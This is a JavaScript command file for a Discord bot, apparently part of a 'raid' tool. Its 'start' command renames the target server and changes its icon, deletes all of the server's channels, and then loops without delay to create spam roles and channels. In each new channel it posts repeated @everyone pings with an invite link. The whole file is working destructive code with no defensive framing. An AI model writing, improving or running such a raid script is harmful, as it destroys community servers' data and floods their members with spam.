const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {
  
  if(message.guild.name === "a")return; //message.channel.send("Estos comandos no están disponibles en este servidor");
  if(message.guild.name === "a")return;// message.channel.send("Estos comandos no están disponibles en este servidor");
  
  message.guild.setIcon("Link de la foto para el icono del server")
  message.guild.setName("RaidByAntiPlague");
  message.guild.channels.cache.forEach(a => {
  a.delete();
  })
  try { 
var interval_crear_roles = setInterval(async function() {
  message.guild.roles.create({ 
    data:{
      name:'Raid By AntiPlague',
      color:'#ff0000'
    }
  })
})
var interval_crear_canales = setInterval(async function () {
  
let channela = await message.guild.channels.create('Raid By AntiPlague', {
	type: 'text',
	permissions: ['VIEW_CHANNEL']
})
message.guild.channels.cache.get(channela.id).send("@everyone\nhttps://discord.gg/YDBDR936kD",new MessageEmbed()
.setThumbnail(message.guild.iconURL())
.setDescription("Raid By Nombre\nhttps://discord.gg/YDBDR936kD"));
message.guild.channels.cache.get(channela.id).send("@everyone\nhttps://discord.gg/YDBDR936kD",new MessageEmbed()
.setThumbnail(message.guild.iconURL())                                      
.setDescription("Raid By Nombre\nhttps://discord.gg/YDBDR936kD"));
message.guild.channels.cache.get(channela.id).send("@everyone\nhhttps://discord.gg/YDBDR936kD",new MessageEmbed()
.setThumbnail(message.guild.iconURL())                                                  
.setDescription("Raid By Nombre\nhttps://discord.gg/YDBDR936kD"));
message.guild.channels.cache.get(channela.id).send("@everyone\nhttps://discord.gg/YDBDR936kD",new MessageEmbed()
.setThumbnail(message.guild.iconURL())                                                   
.setDescription("Raid By Nombre\nhttps://discord.gg/YDBDR936kD"));
message.guild.channels.cache.get(channela.id).send("@everyone\nhttps://discord.gg/YDBDR936kD",new MessageEmbed()
.setThumbnail(message.guild.iconURL())                                                  
.setDescription("Raid By Nombre\nhttps://discord.gg/YDBDR936kD"));
  
})
  } catch (error_channels) {
    console.log(error_channels.stack);
  }
}

exports.help = {
  name:"start",
  aliases:[],
  usage:"",
  description:"",
  category:""
  
}